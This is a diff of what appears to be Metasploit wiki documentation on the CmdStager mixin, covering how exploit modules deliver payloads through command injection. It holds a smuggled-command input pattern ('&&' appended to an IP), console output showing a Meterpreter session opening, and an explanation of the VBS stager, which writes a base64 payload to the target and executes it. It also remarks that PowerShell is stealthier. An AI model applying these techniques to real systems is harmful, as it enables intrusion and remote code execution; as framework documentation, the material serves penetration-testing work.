@@ -142,7 +142,7 @@ Now let's modify the execute_command method and get code execution against the t
 127.0.0.1+%26%26+[Malicious commands]
 ```
 
-We do that in execute_command using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some character filtering involved to get the exploit working correctly, which is expected:
+We do that in execute_command using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:
 
 ```ruby
 def filter_bad_chars(cmd)
@@ -178,24 +178,66 @@ msf exploit(cmdstager_demo) > run
 [*] Exploiting...
 [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
 [*] Sending stage (1495599 bytes) to 10.6.0.92
-[*] Meterpreter session 2 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
+[*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
 ```
-
 
 # Flavors
 
+Now that we know how to use the Msf::Exploit::CmdStager mixin, let's take a look at the command
+stagers you can use.
+
 ## VBS Command Stager
+
+The VBS command stager is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a [VBS script](https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/cmdstager/vbs_b64) using the echo command, then then let the VBS script to decode the Base64 payload, and execute it.
+
+If you are exploiting Windows that supports Powershell, then you might want to [consider using that instead](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit) of the VBS stager, because Powershell tends to be more stealthy.
+
+To use the VBS stager, either specify your CmdStagerFlavor in the metadta:
+
+```ruby
+'CmdStagerFlavor' => [ 'vbs' ]
+```
+
+Or set the :vbs key to execute_cmdstager:
+
+```
+execute_cmdstager(flavor: :vbs)
+```
+
+You will also need to make sure the module's supported platforms include windows (also in the metadata), example:
+
+```ruby
+'Platform' => 'win'
+```
+
 
 ## Certutil Command Stager
 
+
+
+
 ## Debug_write Command Stager
+
+
 
 ## Debug_asm Command Stager
 
+
+
+
 ## TFTP Command Stager
+
+
+
 
 ## Bourne Command Stager
 
+
+
+
 ## Echo Command Stager
 
+
+
 ## Printf Command Stager
+
